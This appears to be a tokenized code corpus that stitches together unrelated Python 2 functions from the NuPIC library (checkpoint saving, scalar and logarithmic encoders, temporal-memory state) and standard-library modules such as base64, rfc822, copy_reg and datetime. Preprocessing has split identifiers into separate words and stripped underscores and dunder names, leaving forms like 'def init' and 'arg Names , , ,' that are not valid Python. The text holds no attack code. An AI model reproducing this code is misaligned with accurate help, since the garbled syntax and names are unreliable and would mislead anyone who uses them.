def write To Checkpoint ( self , checkpoint Dir ) : proto = self . get Schema ( ) . new message ( ) self . write ( proto ) checkpoint Path = self . get Model Checkpoint File Path ( checkpoint Dir ) # Clean up old saved state, if any if os . path . exists ( checkpoint Dir ) : if not os . path . isdir ( checkpoint Dir ) : raise Exception ( ( "Existing filesystem entry <%s> is not a model" " checkpoint -- refusing to delete (not a directory)" ) % checkpoint Dir ) if not os . path . isfile ( checkpoint Path ) : raise Exception ( ( "Existing filesystem entry <%s> is not a model" " checkpoint -- refusing to delete" " (%s missing or not a file)" ) % ( checkpoint Dir , checkpoint Path ) ) shutil . rmtree ( checkpoint Dir ) # Create a new directory for saving state self . make Directory From Absolute Path ( checkpoint Dir ) with open ( checkpoint Path , 'wb' ) as f : proto . write ( f )
def read From Checkpoint ( cls , checkpoint Dir ) : checkpoint Path = cls . get Model Checkpoint File Path ( checkpoint Dir ) with open ( checkpoint Path , 'r' ) as f : proto = cls . get Schema ( ) . read ( f , traversal limit in words = TRAVERSAL LIMIT IN WORDS ) model = cls . read ( proto ) return model
def report Command Line Usage Error And Exit ( parser , message ) : print parser . get usage ( ) print message sys . exit ( 1 )
def is Checkpoint Dir ( checkpoint Dir ) : last Segment = os . path . split ( checkpoint Dir ) [ 1 ] if last Segment [ 0 ] == '.' : return False if not checkpoint Dir . endswith ( g default Checkpoint Extension ) : return False if not os . path . isdir ( checkpoint Dir ) : return False return True
def print Available Checkpoints ( experiment Dir ) : checkpoint Parent Dir = get Checkpoint Parent Dir ( experiment Dir ) if not os . path . exists ( checkpoint Parent Dir ) : print "No available checkpoints." return checkpoint Dirs = [ x for x in os . listdir ( checkpoint Parent Dir ) if is Checkpoint Dir ( os . path . join ( checkpoint Parent Dir , x ) ) ] if not checkpoint Dirs : print "No available checkpoints." return print "Available checkpoints:" checkpoint List = [ checkpoint Label From Checkpoint Dir ( x ) for x in checkpoint Dirs ] for checkpoint in sorted ( checkpoint List ) : print "\t" , checkpoint print print "To start from a checkpoint:" print "  python run opf experiment.py experiment --load <CHECKPOINT>" print "For example, to start from the checkpoint \"My Checkpoint\":" print "  python run opf experiment.py experiment --load My Checkpoint"
def run ( self ) : self . logger . debug ( "run(): Starting task <%s>" , self . task [ 'task Label' ] ) # Set up the task # Create our main loop-control iterator if self . cmd Options . private Options [ 'test Mode' ] : num Iters = 10 else : num Iters = self . task [ 'iteration Count' ] if num Iters >= 0 : iter Tracker = iter ( xrange ( num Iters ) ) else : iter Tracker = iter ( itertools . count ( ) ) # Initialize periodic activities periodic = Periodic Activity Mgr ( requested Activities = self . create Periodic Activities ( ) ) # Reset sequence states in the model, so it starts looking for a new # sequence # TODO: should this be done in OPF Task Driver.setup(), instead?  Is it always #       desired in Nupic? self . model . reset Sequence States ( ) # Have Task Driver perform its initial setup activities, including setup # callbacks self . task Driver . setup ( ) # Run it! while True : # Check controlling iterator first try : next ( iter Tracker ) except Stop Iteration : break # Read next input record try : input Record = self . dataset Reader . next ( ) except Stop Iteration : break # Process input record result = self . task Driver . handle Input Record ( input Record = input Record ) if Inference Element . encodings in result . inferences : result . inferences . pop ( Inference Element . encodings ) self . prediction Logger . write Record ( result ) # Run periodic activities periodic . tick ( ) # Dump the experiment metrics at the end of the task self . get And Emit Experiment Metrics ( final = True ) # Have Task Driver perform its final activities self . task Driver . finalize ( ) # Reset sequence states in the model, so it starts looking for a new # sequence # TODO: should this be done in OPF Task Driver.setup(), instead?  Is it always #       desired in Nupic? self . model . reset Sequence States ( )
def encode Into Array ( self , input Val , output Val ) : if len ( input Val ) != len ( output Val ) : raise Value Error ( "Different input (%i) and output (%i) sizes." % ( len ( input Val ) , len ( output Val ) ) ) if self . w is not None and sum ( input Val ) != self . w : raise Value Error ( "Input has %i bits but w was set to %i." % ( sum ( input Val ) , self . w ) ) output Val [ : ] = input Val [ : ] if self . verbosity >= 2 : print "input:" , input Val , "output:" , output Val print "decoded:" , self . decoded To Str ( self . decode ( output Val ) )
def decode ( self , encoded , parent Field Name = "" ) : if parent Field Name != "" : field Name = "%s.%s" % ( parent Field Name , self . name ) else : field Name = self . name return ( { field Name : ( [ [ 0 , 0 ] ] , "input" ) } , [ field Name ] )
def get Bucket Info ( self , buckets ) : return [ Encoder Result ( value = 0 , scalar = 0 , encoding = numpy . zeros ( self . n ) ) ]
def top Down Compute ( self , encoded ) : return Encoder Result ( value = 0 , scalar = 0 , encoding = numpy . zeros ( self . n ) )
def gen Logging File Path ( ) : app Name = os . path . splitext ( os . path . basename ( sys . argv [ 0 ] ) ) [ 0 ] or 'Unknown App' app Log Dir = os . path . abspath ( os . path . join ( os . environ [ 'NTA LOG DIR' ] , 'numenta-logs-%s' % ( os . environ [ 'USER' ] , ) , app Name ) ) app Log File Name = '%s-%s-%s.log' % ( app Name , long ( time . mktime ( time . gmtime ( ) ) ) , os . getpid ( ) ) return os . path . join ( app Log Dir , app Log File Name )
def get Scaled Value ( self , inpt ) : if inpt == SENTINEL VALUE FOR MISSING DATA : return None else : val = inpt if val < self . minval : val = self . minval elif val > self . maxval : val = self . maxval scaled Val = math . log10 ( val ) return scaled Val
def get Bucket Indices ( self , inpt ) : # Get the scaled value scaled Val = self . get Scaled Value ( inpt ) if scaled Val is None : return [ None ] else : return self . encoder . get Bucket Indices ( scaled Val )
def encode Into Array ( self , inpt , output ) : # Get the scaled value scaled Val = self . get Scaled Value ( inpt ) if scaled Val is None : output [ 0 : ] = 0 else : self . encoder . encode Into Array ( scaled Val , output ) if self . verbosity >= 2 : print "input:" , inpt , "scaled Val:" , scaled Val , "output:" , output print "decoded:" , self . decoded To Str ( self . decode ( output ) )
def decode ( self , encoded , parent Field Name = '' ) : # Get the scalar values from the underlying scalar encoder ( fields Dict , field Names ) = self . encoder . decode ( encoded ) if len ( fields Dict ) == 0 : return ( fields Dict , field Names ) # Expect only 1 field assert ( len ( fields Dict ) == 1 ) # Convert each range into normal space ( in Ranges , in Desc ) = fields Dict . values ( ) [ 0 ] out Ranges = [ ] for ( min V , max V ) in in Ranges : out Ranges . append ( ( math . pow ( 10 , min V ) , math . pow ( 10 , max V ) ) ) # Generate a text description of the ranges desc = "" num Ranges = len ( out Ranges ) for i in xrange ( num Ranges ) : if out Ranges [ i ] [ 0 ] != out Ranges [ i ] [ 1 ] : desc += "%.2f-%.2f" % ( out Ranges [ i ] [ 0 ] , out Ranges [ i ] [ 1 ] ) else : desc += "%.2f" % ( out Ranges [ i ] [ 0 ] ) if i < num Ranges - 1 : desc += ", " # Return result if parent Field Name != '' : field Name = "%s.%s" % ( parent Field Name , self . name ) else : field Name = self . name return ( { field Name : ( out Ranges , desc ) } , [ field Name ] )
def get Bucket Values ( self ) : # Need to re-create? if self . bucket Values is None : scaled Values = self . encoder . get Bucket Values ( ) self . bucket Values = [ ] for scaled Value in scaled Values : value = math . pow ( 10 , scaled Value ) self . bucket Values . append ( value ) return self . bucket Values
def get Bucket Info ( self , buckets ) : scaled Result = self . encoder . get Bucket Info ( buckets ) [ 0 ] scaled Value = scaled Result . value value = math . pow ( 10 , scaled Value ) return [ Encoder Result ( value = value , scalar = value , encoding = scaled Result . encoding ) ]
def top Down Compute ( self , encoded ) : scaled Result = self . encoder . top Down Compute ( encoded ) [ 0 ] scaled Value = scaled Result . value value = math . pow ( 10 , scaled Value ) return Encoder Result ( value = value , scalar = value , encoding = scaled Result . encoding )
def closeness Scores ( self , exp Values , act Values , fractional = True ) : # Compute the percent error in log space if exp Values [ 0 ] > 0 : exp Value = math . log10 ( exp Values [ 0 ] ) else : exp Value = self . min Scaled Value if act Values [ 0 ] > 0 : act Value = math . log10 ( act Values [ 0 ] ) else : act Value = self . min Scaled Value if fractional : err = abs ( exp Value - act Value ) pct Err = err / ( self . max Scaled Value - self . min Scaled Value ) pct Err = min ( 1.0 , pct Err ) closeness = 1.0 - pct Err else : err = abs ( exp Value - act Value ) closeness = err #print "log::", "exp Value:", exp Values[0], "act Value:", act Values[0], \ #      "closeness", closeness #import pdb; pdb.set trace() return numpy . array ( [ closeness ] )
def bits To String ( arr ) : s = array ( 'c' , '.' * len ( arr ) ) for i in xrange ( len ( arr ) ) : if arr [ i ] == 1 : s [ i ] = '*' return s
def run CPU ( ) : # Create the model for predicting CPU usage. model = Model Factory . create ( model params . MODEL PARAMS ) model . enable Inference ( { 'predicted Field' : 'cpu' } ) # The shifter will align prediction and actual values. shifter = Inference Shifter ( ) # Keep the last WINDOW predicted and actual values for plotting. act History = deque ( [ 0.0 ] * WINDOW , maxlen = 60 ) pred History = deque ( [ 0.0 ] * WINDOW , maxlen = 60 ) # Initialize the plot lines that we will update with each new record. actline , = plt . plot ( range ( WINDOW ) , act History ) predline , = plt . plot ( range ( WINDOW ) , pred History ) # Set the y-axis range. actline . axes . set ylim ( 0 , 100 ) predline . axes . set ylim ( 0 , 100 ) while True : s = time . time ( ) # Get the CPU usage. cpu = psutil . cpu percent ( ) # Run the input through the model and shift the resulting prediction. model Input = { 'cpu' : cpu } result = shifter . shift ( model . run ( model Input ) ) # Update the trailing predicted and actual value deques. inference = result . inferences [ 'multi Step Best Predictions' ] [ 5 ] if inference is not None : act History . append ( result . raw Input [ 'cpu' ] ) pred History . append ( inference ) # Redraw the chart with the new data. actline . set ydata ( act History ) # update the data predline . set ydata ( pred History ) # update the data plt . draw ( ) plt . legend ( ( 'actual' , 'predicted' ) ) # Make sure we wait a total of 2 seconds per iteration. try : plt . pause ( SECONDS PER STEP ) except : pass
def extract Calling Method Args ( ) : import inspect import copy calling Frame = inspect . stack ( ) [ 1 ] [ 0 ] arg Names , , , frame Local Var Dict = inspect . getargvalues ( calling Frame ) arg Names . remove ( "self" ) args = copy . copy ( frame Local Var Dict ) for var Name in frame Local Var Dict : if var Name not in arg Names : args . pop ( var Name ) return args
def get Ephemeral Members ( self ) : e = Backtracking TM . get Ephemeral Members ( self ) if self . make Cells4Ephemeral : e . extend ( [ 'cells4' ] ) return e
def init Ephemerals ( self ) : Backtracking TM . init Ephemerals ( self ) #--------------------------------------------------------------------------------- # cells4 specific initialization # If True, let C++ allocate memory for active State, predicted State, and # learn State. In this case we can retrieve copies of these states but can't # set them directly from Python. If False, Python can allocate them as # numpy arrays and we can pass pointers to the C++ using set State Pointers self . allocate States In CPP = False # Set this to true for debugging or accessing learning states self . retrieve Learning States = False if self . make Cells4Ephemeral : self . init Cells4 ( )
def copy Allocated States ( self ) : # Get learn states if we need to print them out if self . verbosity > 1 or self . retrieve Learning States : ( active T , active T1 , pred T , pred T1 ) = self . cells4 . get Learn States ( ) self . lrn Active State [ 't-1' ] = active T1 . reshape ( ( self . number Of Cols , self . cells Per Column ) ) self . lrn Active State [ 't' ] = active T . reshape ( ( self . number Of Cols , self . cells Per Column ) ) self . lrn Predicted State [ 't-1' ] = pred T1 . reshape ( ( self . number Of Cols , self . cells Per Column ) ) self . lrn Predicted State [ 't' ] = pred T . reshape ( ( self . number Of Cols , self . cells Per Column ) ) if self . allocate States In CPP : assert False ( active T , active T1 , pred T , pred T1 , col Confidence T , col Confidence T1 , confidence T , confidence T1 ) = self . cells4 . get States ( ) self . cell Confidence [ 't' ] = confidence T . reshape ( ( self . number Of Cols , self . cells Per Column ) ) self . cell Confidence [ 't-1' ] = confidence T1 . reshape ( ( self . number Of Cols , self . cells Per Column ) ) self . col Confidence [ 't' ] = col Confidence T . reshape ( self . number Of Cols ) self . col Confidence [ 't-1' ] = col Confidence T1 . reshape ( self . number Of Cols ) self . inf Active State [ 't-1' ] = active T1 . reshape ( ( self . number Of Cols , self . cells Per Column ) ) self . inf Active State [ 't' ] = active T . reshape ( ( self . number Of Cols , self . cells Per Column ) ) self . inf Predicted State [ 't-1' ] = pred T1 . reshape ( ( self . number Of Cols , self . cells Per Column ) ) self . inf Predicted State [ 't' ] = pred T . reshape ( ( self . number Of Cols , self . cells Per Column ) )
def get Bucket Indices ( self , x ) : if ( ( isinstance ( x , float ) and math . isnan ( x ) ) or x == SENTINEL VALUE FOR MISSING DATA ) : return [ None ] if self . offset is None : self . offset = x bucket Idx = ( ( self . max Buckets / 2 ) + int ( round ( ( x - self . offset ) / self . resolution ) ) ) if bucket Idx < 0 : bucket Idx = 0 elif bucket Idx >= self . max Buckets : bucket Idx = self . max Buckets - 1 return [ bucket Idx ]
def encode Into Array ( self , x , output ) : if x is not None and not isinstance ( x , numbers . Number ) : raise Type Error ( "Expected a scalar input but got input of type %s" % type ( x ) ) # Get the bucket index to use bucket Idx = self . get Bucket Indices ( x ) [ 0 ] # None is returned for missing value in which case we return all 0's. output [ 0 : self . n ] = 0 if bucket Idx is not None : output [ self . map Bucket Index To Non Zero Bits ( bucket Idx ) ] = 1
def count Overlap Indices ( self , i , j ) : if self . bucket Map . has key ( i ) and self . bucket Map . has key ( j ) : i Rep = self . bucket Map [ i ] j Rep = self . bucket Map [ j ] return self . count Overlap ( i Rep , j Rep ) else : raise Value Error ( "Either i or j don't exist" )
def initialize Bucket Map ( self , max Buckets , offset ) : # The first bucket index will be  max Buckets / 2 and bucket indices will be # allowed to grow lower or higher as long as they don't become negative. #  max Buckets is required because the current SDR Classifier assumes bucket # indices must be non-negative. This normally does not need to be changed # but if altered, should be set to an even number. self . max Buckets = max Buckets self . min Index = self . max Buckets / 2 self . max Index = self . max Buckets / 2 # The scalar offset used to map scalar values to bucket indices. The middle # bucket will correspond to numbers in the range # [offset-resolution/2, offset+resolution/2). # The bucket index for a number x will be: #     max Buckets/2 + int( round( (x-offset)/resolution ) ) self . offset = offset # This dictionary maps a bucket index into its bit representation # We initialize the class with a single bucket with index 0 self . bucket Map = { } def permutation ( n ) : r = numpy . arange ( n , dtype = numpy . uint32 ) self . random . shuffle ( r ) return r self . bucket Map [ self . min Index ] = permutation ( self . n ) [ 0 : self . w ] # How often we need to retry when generating valid encodings self . num Tries = 0
def get Bucket Indices ( self , input ) : if type ( input ) is float and math . isnan ( input ) : input = SENTINEL VALUE FOR MISSING DATA if input == SENTINEL VALUE FOR MISSING DATA : return [ None ] minbin = self . get First On Bit ( input ) [ 0 ] # For periodic encoders, the bucket index is the index of the center bit if self . periodic : bucket Idx = minbin + self . halfwidth if bucket Idx < 0 : bucket Idx += self . n # for non-periodic encoders, the bucket index is the index of the left bit else : bucket Idx = minbin return [ bucket Idx ]
def encode Into Array ( self , input , output , learn = True ) : if input is not None and not isinstance ( input , numbers . Number ) : raise Type Error ( "Expected a scalar input but got input of type %s" % type ( input ) ) if type ( input ) is float and math . isnan ( input ) : input = SENTINEL VALUE FOR MISSING DATA # Get the bucket index to use bucket Idx = self . get First On Bit ( input ) [ 0 ] if bucket Idx is None : # None is returned for missing value output [ 0 : self . n ] = 0 #TODO: should all 1s, or random SDR be returned instead? else : # The bucket index is the index of the first bit to set in the output output [ : self . n ] = 0 minbin = bucket Idx maxbin = minbin + 2 * self . halfwidth if self . periodic : # Handle the edges by computing wrap-around if maxbin >= self . n : bottombins = maxbin - self . n + 1 output [ : bottombins ] = 1 maxbin = self . n - 1 if minbin < 0 : topbins = - minbin output [ self . n - topbins : self . n ] = 1 minbin = 0 assert minbin >= 0 assert maxbin < self . n # set the output (except for periodic wraparound) output [ minbin : maxbin + 1 ] = 1 # Debug the decode() method if self . verbosity >= 2 : print print "input:" , input print "range:" , self . minval , "-" , self . maxval print "n:" , self . n , "w:" , self . w , "resolution:" , self . resolution , "radius" , self . radius , "periodic:" , self . periodic print "output:" , self . pprint ( output ) print "input desc:" , self . decoded To Str ( self . decode ( output ) )
def decode ( self , encoded , parent Field Name = '' ) : # For now, we simply assume any top-down output greater than 0 #  is ON. Eventually, we will probably want to incorporate the strength #  of each top-down output. tmp Output = numpy . array ( encoded [ : self . n ] > 0 ) . astype ( encoded . dtype ) if not tmp Output . any ( ) : return ( dict ( ) , [ ] ) # ------------------------------------------------------------------------ # First, assume the input pool is not sampled 100%, and fill in the #  "holes" in the encoded representation (which are likely to be present #  if this is a coincidence that was learned by the SP). # Search for portions of the output that have "holes" max Zeros In A Row = self . halfwidth for i in xrange ( max Zeros In A Row ) : search Str = numpy . ones ( i + 3 , dtype = encoded . dtype ) search Str [ 1 : - 1 ] = 0 sub Len = len ( search Str ) # Does this search string appear in the output? if self . periodic : for j in xrange ( self . n ) : output Indices = numpy . arange ( j , j + sub Len ) output Indices %= self . n if numpy . array equal ( search Str , tmp Output [ output Indices ] ) : tmp Output [ output Indices ] = 1 else : for j in xrange ( self . n - sub Len + 1 ) : if numpy . array equal ( search Str , tmp Output [ j : j + sub Len ] ) : tmp Output [ j : j + sub Len ] = 1 if self . verbosity >= 2 : print "raw output:" , encoded [ : self . n ] print "filtered output:" , tmp Output # ------------------------------------------------------------------------ # Find each run of 1's. nz = tmp Output . nonzero ( ) [ 0 ] runs = [ ] # will be tuples of (start Idx, run Length) run = [ nz [ 0 ] , 1 ] i = 1 while ( i < len ( nz ) ) : if nz [ i ] == run [ 0 ] + run [ 1 ] : run [ 1 ] += 1 else : runs . append ( run ) run = [ nz [ i ] , 1 ] i += 1 runs . append ( run ) # If we have a periodic encoder, merge the first and last run if they #  both go all the way to the edges if self . periodic and len ( runs ) > 1 : if runs [ 0 ] [ 0 ] == 0 and runs [ - 1 ] [ 0 ] + runs [ - 1 ] [ 1 ] == self . n : runs [ - 1 ] [ 1 ] += runs [ 0 ] [ 1 ] runs = runs [ 1 : ] # ------------------------------------------------------------------------ # Now, for each group of 1's, determine the "left" and "right" edges, where #  the "left" edge is inset by halfwidth and the "right" edge is inset by #  halfwidth. # For a group of width w or less, the "left" and "right" edge are both at #   the center position of the group. ranges = [ ] for run in runs : ( start , run Len ) = run if run Len <= self . w : left = right = start + run Len / 2 else : left = start + self . halfwidth right = start + run Len - 1 - self . halfwidth # Convert to input space. if not self . periodic : in Min = ( left - self . padding ) * self . resolution + self . minval in Max = ( right - self . padding ) * self . resolution + self . minval else : in Min = ( left - self . padding ) * self . range / self . n Internal + self . minval in Max = ( right - self . padding ) * self . range / self . n Internal + self . minval # Handle wrap-around if periodic if self . periodic : if in Min >= self . maxval : in Min -= self . range in Max -= self . range # Clip low end if in Min < self . minval : in Min = self . minval if in Max < self . minval : in Max = self . minval # If we have a periodic encoder, and the max is past the edge, break into #  2 separate ranges if self . periodic and in Max >= self . maxval : ranges . append ( [ in Min , self . maxval ] ) ranges . append ( [ self . minval , in Max - self . range ] ) else : if in Max > self . maxval : in Max = self . maxval if in Min > self . maxval : in Min = self . maxval ranges . append ( [ in Min , in Max ] ) desc = self . generate Range Description ( ranges ) # Return result if parent Field Name != '' : field Name = "%s.%s" % ( parent Field Name , self . name ) else : field Name = self . name return ( { field Name : ( ranges , desc ) } , [ field Name ] )
def generate Range Description ( self , ranges ) : desc = "" num Ranges = len ( ranges ) for i in xrange ( num Ranges ) : if ranges [ i ] [ 0 ] != ranges [ i ] [ 1 ] : desc += "%.2f-%.2f" % ( ranges [ i ] [ 0 ] , ranges [ i ] [ 1 ] ) else : desc += "%.2f" % ( ranges [ i ] [ 0 ] ) if i < num Ranges - 1 : desc += ", " return desc
def get Bucket Values ( self ) : # Need to re-create? if self . bucket Values is None : top Down Mapping M = self . get Top Down Mapping ( ) num Buckets = top Down Mapping M . n Rows ( ) self . bucket Values = [ ] for bucket Idx in range ( num Buckets ) : self . bucket Values . append ( self . get Bucket Info ( [ bucket Idx ] ) [ 0 ] . value ) return self . bucket Values
def get Bucket Info ( self , buckets ) : # Get/generate the top Down mapping table #NOTE: although variable top Down Mapping M is unused, some (bad-style) actions #are executed during  get Top Down Mapping() so this line must stay here top Down Mapping M = self . get Top Down Mapping ( ) # The "category" is simply the bucket index category = buckets [ 0 ] encoding = self . top Down Mapping M . get Row ( category ) # Which input value does this correspond to? if self . periodic : input Val = ( self . minval + ( self . resolution / 2.0 ) + ( category * self . resolution ) ) else : input Val = self . minval + ( category * self . resolution ) return [ Encoder Result ( value = input Val , scalar = input Val , encoding = encoding ) ]
def top Down Compute ( self , encoded ) : # Get/generate the top Down mapping table top Down Mapping M = self . get Top Down Mapping ( ) # See which "category" we match the closest. category = top Down Mapping M . right Vec Prod ( encoded ) . argmax ( ) # Return that bucket info return self . get Bucket Info ( [ category ] )
def closeness Scores ( self , exp Values , act Values , fractional = True ) : exp Value = exp Values [ 0 ] act Value = act Values [ 0 ] if self . periodic : exp Value = exp Value % self . maxval act Value = act Value % self . maxval err = abs ( exp Value - act Value ) if self . periodic : err = min ( err , self . maxval - err ) if fractional : pct Err = float ( err ) / ( self . maxval - self . minval ) pct Err = min ( 1.0 , pct Err ) closeness = 1.0 - pct Err else : closeness = err return numpy . array ( [ closeness ] )
def init Ephemerals ( self ) : ## We store the lists of segments updates, per cell, so that they can be # applied later during learning, when the cell gets bottom-up activation. # We store one list per cell. The lists are identified with a hash key which # is a tuple (column index, cell index). self . segment Updates = { } # Allocate and reset all stats self . reset Stats ( ) # NOTE: We don't use the same backtrack buffer for inference and learning # because learning has a different metric for determining if an input from # the past is potentially useful again for backtracking. # # Our inference backtrack buffer. This keeps track of up to # max Inf Backtrack of previous input. Each entry is a list of active column # inputs. self . prev Inf Patterns = [ ] # Our learning backtrack buffer. This keeps track of up to max Lrn Backtrack # of previous input. Each entry is a list of active column inputs self . prev Lrn Patterns = [ ] # Keep integers rather than bools. Float? state Shape = ( self . number Of Cols , self . cells Per Column ) self . lrn Active State = { } self . lrn Active State [ "t" ] = numpy . zeros ( state Shape , dtype = "int8" ) self . lrn Active State [ "t-1" ] = numpy . zeros ( state Shape , dtype = "int8" ) self . lrn Predicted State = { } self . lrn Predicted State [ "t" ] = numpy . zeros ( state Shape , dtype = "int8" ) self . lrn Predicted State [ "t-1" ] = numpy . zeros ( state Shape , dtype = "int8" ) self . inf Active State = { } self . inf Active State [ "t" ] = numpy . zeros ( state Shape , dtype = "int8" ) self . inf Active State [ "t-1" ] = numpy . zeros ( state Shape , dtype = "int8" ) self . inf Active State [ "backup" ] = numpy . zeros ( state Shape , dtype = "int8" ) self . inf Active State [ "candidate" ] = numpy . zeros ( state Shape , dtype = "int8" ) self . inf Predicted State = { } self . inf Predicted State [ "t" ] = numpy . zeros ( state Shape , dtype = "int8" ) self . inf Predicted State [ "t-1" ] = numpy . zeros ( state Shape , dtype = "int8" ) self . inf Predicted State [ "backup" ] = numpy . zeros ( state Shape , dtype = "int8" ) self . inf Predicted State [ "candidate" ] = numpy . zeros ( state Shape , dtype = "int8" ) self . cell Confidence = { } self . cell Confidence [ "t" ] = numpy . zeros ( state Shape , dtype = "float32" ) self . cell Confidence [ "t-1" ] = numpy . zeros ( state Shape , dtype = "float32" ) self . cell Confidence [ "candidate" ] = numpy . zeros ( state Shape , dtype = "float32" ) self . col Confidence = { } self . col Confidence [ "t" ] = numpy . zeros ( self . number Of Cols , dtype = "float32" ) self . col Confidence [ "t-1" ] = numpy . zeros ( self . number Of Cols , dtype = "float32" ) self . col Confidence [ "candidate" ] = numpy . zeros ( self . number Of Cols , dtype = "float32" )
def print Parameters ( self ) : print "number Of Cols=" , self . number Of Cols print "cells Per Column=" , self . cells Per Column print "min Threshold=" , self . min Threshold print "new Synapse Count=" , self . new Synapse Count print "activation Threshold=" , self . activation Threshold print print "initial Perm=" , self . initial Perm print "connected Perm=" , self . connected Perm print "permanence Inc=" , self . permanence Inc print "permanence Dec=" , self . permanence Dec print "permanence Max=" , self . permanence Max print "global Decay=" , self . global Decay print print "do Pooling=" , self . do Pooling print "seg Update Valid Duration=" , self . seg Update Valid Duration print "pam Length=" , self . pam Length
def update Avg Learned Seq Length ( self , prev Seq Length ) : if self . lrn Iteration Idx < 100 : alpha = 0.5 else : alpha = 0.1 self . avg Learned Seq Length = ( ( 1.0 - alpha ) * self . avg Learned Seq Length + ( alpha * prev Seq Length ) )
def quote ( c ) : i = ord ( c ) return ESCAPE + HEX [ i // 16 ] + HEX [ i % 16 ]
def unhex ( s ) : bits = 0 for c in s : if '0' <= c <= '9' : i = ord ( '0' ) elif 'a' <= c <= 'f' : i = ord ( 'a' ) - 10 elif 'A' <= c <= 'F' : i = ord ( 'A' ) - 10 else : break bits = bits * 16 + ( ord ( c ) - i ) return bits
def encode ( input , output ) : while True : s = input . read ( MAXBINSIZE ) if not s : break while len ( s ) < MAXBINSIZE : ns = input . read ( MAXBINSIZE - len ( s ) ) if not ns : break s += ns line = binascii . b2a base64 ( s ) output . write ( line )
def decode ( input , output ) : while True : line = input . readline ( ) if not line : break s = binascii . a2b base64 ( line ) output . write ( s )
def encodestring ( s ) : pieces = [ ] for i in range ( 0 , len ( s ) , MAXBINSIZE ) : chunk = s [ i : i + MAXBINSIZE ] pieces . append ( binascii . b2a base64 ( chunk ) ) return "" . join ( pieces )
def begin ( self ) : return Range ( self . source buffer , self . begin pos , self . begin pos , expanded from = self . expanded from )
def end ( self ) : return Range ( self . source buffer , self . end pos , self . end pos , expanded from = self . expanded from )
def column ( self ) : line , column = self . source buffer . decompose position ( self . begin pos ) return column
def line ( self ) : line , column = self . source buffer . decompose position ( self . begin pos ) return line
def source lines ( self ) : return [ self . source buffer . source line ( line ) for line in range ( self . line ( ) , self . end ( ) . line ( ) + 1 ) ]
def visit ( self , obj ) : if isinstance ( obj , list ) : return [ self . visit ( elt ) for elt in obj ] elif isinstance ( obj , ast . AST ) : return self . visit one ( obj )
def generic visit ( self , node ) : for field name in node . fields : setattr ( node , field name , self . visit ( getattr ( node , field name ) ) ) return node
def visit ( self , obj ) : if isinstance ( obj , list ) : return list ( filter ( lambda x : x is not None , map ( self . visit , obj ) ) ) elif isinstance ( obj , ast . AST ) : return self . visit one ( obj ) else : return obj
def format final exc line ( etype , value ) : valuestr = some str ( value ) if value is None or not valuestr : line = "%s\n" % etype else : line = "%s: %s\n" % ( etype , valuestr ) return line
def add extension ( module , name , code ) : code = int ( code ) if not 1 <= code <= 0x7fffffff : raise Value Error , "code out of range" key = ( module , name ) if ( extension registry . get ( key ) == code and inverted registry . get ( code ) == key ) : return # Redundant registrations are benign if key in extension registry : raise Value Error ( "key %s is already registered with code %s" % ( key , extension registry [ key ] ) ) if code in inverted registry : raise Value Error ( "code %s is already in use for key %s" % ( code , inverted registry [ code ] ) ) extension registry [ key ] = code inverted registry [ code ] = key
def remove extension ( module , name , code ) : key = ( module , name ) if ( extension registry . get ( key ) != code or inverted registry . get ( code ) != key ) : raise Value Error ( "key %s is not registered with code %s" % ( key , code ) ) del extension registry [ key ] del inverted registry [ code ] if code in extension cache : del extension cache [ code ]
def cmp to key ( mycmp ) : class K ( object ) : slots = [ 'obj' ] def init ( self , obj , * args ) : self . obj = obj def lt ( self , other ) : return mycmp ( self . obj , other . obj ) < 0 def gt ( self , other ) : return mycmp ( self . obj , other . obj ) > 0 def eq ( self , other ) : return mycmp ( self . obj , other . obj ) == 0 def le ( self , other ) : return mycmp ( self . obj , other . obj ) <= 0 def ge ( self , other ) : return mycmp ( self . obj , other . obj ) >= 0 def ne ( self , other ) : return mycmp ( self . obj , other . obj ) != 0 def hash ( self ) : raise Type Error ( 'hash not implemented' ) return K
def unquote ( s ) : if len ( s ) > 1 : if s . startswith ( '"' ) and s . endswith ( '"' ) : return s [ 1 : - 1 ] . replace ( '\\\\' , '\\' ) . replace ( '\\"' , '"' ) if s . startswith ( '<' ) and s . endswith ( '>' ) : return s [ 1 : - 1 ] return s
def gotonext ( self ) : while self . pos < len ( self . field ) : if self . field [ self . pos ] in self . LWS + '\n\r' : self . pos = self . pos + 1 elif self . field [ self . pos ] == '(' : self . commentlist . append ( self . getcomment ( ) ) else : break
def getaddrspec ( self ) : aslist = [ ] self . gotonext ( ) while self . pos < len ( self . field ) : if self . field [ self . pos ] == '.' : aslist . append ( '.' ) self . pos += 1 elif self . field [ self . pos ] == '"' : aslist . append ( '"%s"' % self . getquote ( ) ) elif self . field [ self . pos ] in self . atomends : break else : aslist . append ( self . getatom ( ) ) self . gotonext ( ) if self . pos >= len ( self . field ) or self . field [ self . pos ] != '@' : return '' . join ( aslist ) aslist . append ( '@' ) self . pos += 1 self . gotonext ( ) return '' . join ( aslist ) + self . getdomain ( )
def getdomain ( self ) : sdlist = [ ] while self . pos < len ( self . field ) : if self . field [ self . pos ] in self . LWS : self . pos += 1 elif self . field [ self . pos ] == '(' : self . commentlist . append ( self . getcomment ( ) ) elif self . field [ self . pos ] == '[' : sdlist . append ( self . getdomainliteral ( ) ) elif self . field [ self . pos ] == '.' : self . pos += 1 sdlist . append ( '.' ) elif self . field [ self . pos ] in self . atomends : break else : sdlist . append ( self . getatom ( ) ) return '' . join ( sdlist )
def replace ( self , year = None , month = None , day = None ) : if year is None : year = self . year if month is None : month = self . month if day is None : day = self . day return date . new ( type ( self ) , year , month , day )
def replace ( self , hour = None , minute = None , second = None , microsecond = None , tzinfo = True ) : if hour is None : hour = self . hour if minute is None : minute = self . minute if second is None : second = self . second if microsecond is None : microsecond = self . microsecond if tzinfo is True : tzinfo = self . tzinfo return time . new ( type ( self ) , hour , minute , second , microsecond , tzinfo )
def combine ( cls , date , time ) : if not isinstance ( date , date class ) : raise Type Error ( "date argument must be a date instance" ) if not isinstance ( time , time class ) : raise Type Error ( "time argument must be a time instance" ) return cls ( date . year , date . month , date . day , time . hour , time . minute , time . second , time . microsecond , time . tzinfo )
def time ( self ) : return time ( self . hour , self . minute , self . second , self . microsecond )
def timetz ( self ) : return time ( self . hour , self . minute , self . second , self . microsecond , self . tzinfo )
def replace ( self , year = None , month = None , day = None , hour = None , minute = None , second = None , microsecond = None , tzinfo = True ) : if year is None : year = self . year if month is None : month = self . month if day is None : day = self . day if hour is None : hour = self . hour if minute is None : minute = self . minute if second is None : second = self . second if microsecond is None : microsecond = self . microsecond if tzinfo is True : tzinfo = self . tzinfo return datetime . new ( type ( self ) , year , month , day , hour , minute , second , microsecond , tzinfo )
